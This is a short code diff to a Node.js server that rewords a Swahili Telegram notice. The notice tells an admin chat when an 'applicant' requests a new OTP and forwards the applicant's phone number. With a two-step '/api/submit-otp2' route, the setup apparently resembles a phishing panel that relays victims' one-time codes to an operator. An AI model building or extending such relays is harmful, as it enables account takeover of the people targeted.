@@ -322,7 +322,7 @@ app.post('/api/submit-otp2', async (req, res) => {
   }
 });
 
-// New endpoint to notify admin when applicant requests a new OTP in Swahili
+// Endpoint that notifies the Telegram admin when the applicant clicks "Omba OTP Mpya"
 app.post('/api/request-new-otp', async (req, res) => {
   try {
     const { userId, phone, step } = req.body || {};
@@ -331,9 +331,9 @@ app.post('/api/request-new-otp', async (req, res) => {
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
     const targetChat = session.adminChatId;
-    const message = `⚠️ *OMBI LA OTP MPYA (${step === 1 ? 'Hatua ya 1' : 'Hatua ya 2'})*\n\n` +
+    const message = `🔄 *OMBI LA OTP MPYA (${step === 1 ? 'Hatua ya 1' : 'Hatua ya 2'})*\n\n` +
                     `📞 *Namba ya Simu:* \`${phone || session.phone || 'N/A'}\`\n` +
-                    `📢 Mteja ameomba kutumiwa OTP mpya kwa sababu muda umeisha.`;
+                    `⚠️ Mteja amebofya kitufe cha kuomba OTP mpya baada ya muda wa sekunde 30 kuisha.`;
 
     if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
     return res.status(200).json({ success: true });
@@ -347,4 +347,3 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                               
